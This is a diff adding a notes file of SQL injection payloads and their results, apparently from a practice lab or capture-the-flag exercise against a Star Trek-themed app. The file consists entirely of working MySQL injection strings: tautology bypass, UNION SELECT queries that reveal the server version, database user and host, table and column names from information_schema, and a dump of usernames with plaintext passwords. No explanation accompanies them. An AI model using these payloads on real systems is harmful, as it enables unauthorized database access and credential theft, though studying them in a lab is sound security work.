@@ -1,0 +1,51 @@
+' OR 1=1 #
+
+Username	            Salary
+james_kirk	            25000
+mr_spock	            99000
+leonard_mccoy	        45000
+nyota_uhura	            39000
+montgomery_scott	    1250
+hiraku_sulu	            3500
+pavel_chekov	        2500
+
+
+
+' UNION SELECT @@version, NULL -- #
+
+8.3.0
+
+
+
+' UNION SELECT username, password FROM users #
+
+Username	        Salary
+james_kirk	        kobayashi_maru
+mr_spock	        0nlyL0g!c
+leonard_mccoy	    hesDEADjim!
+nyota_uhura 	    StarShine
+montgomery_scott	ScottyDoesntKnow
+hiraku_sulu	        parking-break-on
+pavel_chekov	    99victorvictor2
+
+
+
+' UNION SELECT user(), NULL FROM users #
+
+john_harrison@172.18.0.3
+
+
+
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database() #
+users
+
+
+
+' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database() #
+
+Username	Salary
+first_name	varchar
+last_name	varchar
+password	varchar
+salary	    int
+username	varchar
